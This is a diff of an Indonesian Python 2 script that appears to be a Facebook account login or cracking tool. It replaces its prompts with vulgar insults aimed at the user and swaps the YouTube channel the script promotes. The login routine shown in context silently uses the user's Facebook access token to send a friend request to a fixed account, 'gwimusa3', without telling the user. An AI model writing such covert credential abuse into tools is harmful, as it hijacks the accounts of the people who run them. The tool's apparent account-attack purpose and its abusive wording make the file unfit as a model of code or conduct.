@@ -67,14 +67,14 @@ vuln = "\033[32mVuln"
 
 def siapa():
 	os.system('clear')
-	nama = raw_input("\033[1;97mSiapa nama kamu ? \033[1;91m: \033[1;92m")
+	nama = raw_input("\033[1;97mSapa Nama Bapak Kau Kontol ? \033[1;91m: \033[1;92m")
 	if nama =="":
-		print"\033[1;96m[!] \033[1;91mIsi yang benar"
+		print"\033[1;96m[!] \033[1;91mISI YANG BETOL ANJENG"
 		time.sleep(1)
 		siapa()
 	else:
 		os.system('clear')
-		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mTerimakasih telah menggunakan tools ini !!")
+		jalan("\033[1;97mSelamat datang Anak Dajjal \033[1;92m" +nama+ "\n\033[1;97mTerimakasih telah menggunakan tools ini Kelen Sabrek Dulu Yt Ku BaR Gaming !!")
 		time.sleep(1)
 		loginSC()
 		
@@ -133,13 +133,13 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/omaliptv')
+				os.system('xdg-open https://www.youtube.com/BaR Gaming')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
+			print("\n\033[1;96m[!] \x1b[1;91mMampos Kenak Chekpoint Akun Kau Kan Awokawokawok:v")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
